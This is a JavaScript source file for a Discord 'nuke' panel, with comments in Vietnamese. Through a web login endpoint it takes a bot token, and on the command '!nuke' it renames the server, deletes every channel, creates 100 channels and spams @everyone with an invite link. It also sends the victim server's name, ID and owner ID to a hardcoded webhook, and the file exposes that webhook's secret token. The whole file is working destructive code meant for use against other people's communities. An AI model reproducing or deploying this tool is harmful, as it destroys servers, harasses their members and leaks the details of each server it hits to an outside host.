import express from 'express';
import { Client, GatewayIntentBits, ChannelType } from 'discord.js';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// WEBHOOK THÔNG BÁO
const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';

// CẤU HÌNH CỐ ĐỊNH (Đã fix ping @everyone ở dòng riêng)
const CONFIG = {
  channelName: 'anh-phtuankhanh-nuke',
  renameName: 'NUKE BY PHTUANKHANH',
  channelCount: 100,
  msgContent: '# > NUKE BY PHTUANKHANH\n\n@everyone\n\nhttps://discord.gg/BqZ7UdtwXG',
  msgCount: 1,
  pingEveryone: true
};

let botClient = null;
let currentToken = null;
let currentClientId = null;
let webLogs = [];

function pushLog(msg, type = 'info') {
  const log = { time: new Date().toLocaleTimeString(), msg, type };
  webLogs.push(log);
  if (webLogs.length > 200) webLogs.shift();
  console.log(`[${type.toUpperCase()}] ${msg}`);
}

async function notifyNuke(info) {
  const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
  const embed = {
    title: error ? 'Nuke thất bại' : 'Nuke thành công',
    color: error ? 0xff0000 : 0x00ff66,
    fields: [
      { name: 'Server', value: guildName || 'không rõ', inline: true },
      { name: 'Guild ID', value: guildId || '-', inline: true },
      { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
      { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
      { name: 'Người dùng', value: user || '-', inline: true },
      { name: 'Owner ID', value: ownerId || '-', inline: true },
      { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
    ],
    thumbnail: guildIcon ? { url: guildIcon } : undefined,
    footer: { text: 'nuke panel | by PhTuanKhanh' },
    timestamp: new Date().toISOString(),
  };
  if (guildId) embed.fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
  if (error) embed.fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
  
  const body = { username: 'nuke notifier', avatar_url: guildIcon || null, embeds: [embed] };
  
  try {
    await fetch(NOTIFY_WEBHOOK + '?wait=false', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) {
    pushLog(`Webhook error: ${e.message}`, 'error');
  }
}

function startBot(token) {
  if (botClient) {
    botClient.destroy();
    botClient = null;
  }

  currentToken = token;
  botClient = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers
    ]
  });

  botClient.on('ready', () => {
    currentClientId = botClient.user.id;
    pushLog(`Bot đã online: ${botClient.user.tag}`, 'success');
  });

  botClient.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '!nuke') return;

    const guild = message.guild;
    const t0 = Date.now();
    message.reply('🚀 Bắt đầu nuke...').catch(() => {});
    pushLog(`Bắt đầu nuke server: ${guild.name}`, 'warn');

    let channelsCreated = 0;
    let msgsSent = 0;

    try {
      const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;

      // 1. RENAME GUILD
      if (rName) {
        pushLog(`Đang đổi tên server...`, 'info');
        await guild.setName(rName).catch(() => {});
      }

      // 2. GỬI WEBHOOK THÔNG BÁO
      await notifyNuke({
        guildName: guild.name,
        guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
        guildId: guild.id, ownerId: guild.ownerId,
        channels: cc, msgs: cc * mc,
        user: botClient.user.username,
        error: null,
      });
      pushLog('Đã gửi webhook thông báo.', 'success');

      // 3. XOÁ ALL KÊNH
      pushLog(`Đang xoá toàn bộ kênh...`, 'info');
      const oldChannels = await guild.channels.fetch().catch(() => null);
      if (oldChannels) {
        await Promise.allSettled(
          Array.from(oldChannels.values()).filter(Boolean).map(c => c.delete().catch(() => {}))
        );
      }

      // 4. TẠO KÊNH + SPAM
      pushLog(`Đang tạo ${cc} kênh và spam tin nhắn...`, 'info');
      const createPromises = Array.from({ length: cc }, () =>
        guild.channels.create({
          name: chName,
          type: ChannelType.GuildText,
        }).then(async c => {
          channelsCreated++;
          for (let i = 0; i < mc; i++) {
            await c.send({
              content: msgText,
              allowedMentions: ping ? { parse: ['everyone'] } : { parse: [] }
            }).then(() => { msgsSent++; }).catch(() => {});
          }
        }).catch(() => null)
      );

      await Promise.allSettled(createPromises);

      pushLog(`NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');

    } catch (err) {
      pushLog(`Lỗi nuke: ${err.message}`, 'error');
    }
  });

  botClient.login(token).catch(e => {
    pushLog(`Lỗi đăng nhập: ${e.message}`, 'error');
    botClient = null;
    currentClientId = null;
  });
}

// --- API ROUTES ---
app.post('/api/login', async (req, res) => {
  const { token } = req.body ?? {};
  
  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Thiếu token' });

  const cleanToken = token.trim();
  if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) return res.status(400).json({ error: 'Token không hợp lệ' });

  pushLog('Đang kết nối bot...', 'info');
  startBot(cleanToken);
  
  await new Promise(r => setTimeout(r, 2000));
  
  if (botClient && botClient.user) {
    res.json({ 
      ok: true, 
      user: botClient.user.tag,
      clientId: botClient.user.id
    });
  } else {
    res.status(500).json({ error: 'Đăng nhập thất bại, kiểm tra token hoặc Developer Portal' });
  }
});

app.post('/api/logout', (req, res) => {
  if (botClient) {
    botClient.destroy();
    botClient = null;
    currentToken = null;
    currentClientId = null;
    pushLog('Bot đã tắt.', 'warn');
  }
  res.json({ ok: true });
});

app.get('/api/status', (req, res) => {
  res.json({
    online: !!(botClient && botClient.user),
    user: botClient?.user?.tag || null,
    clientId: currentClientId
  });
});

app.get('/api/logs', (req, res) => {
  res.json(webLogs);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`panel http://localhost:${PORT}`));
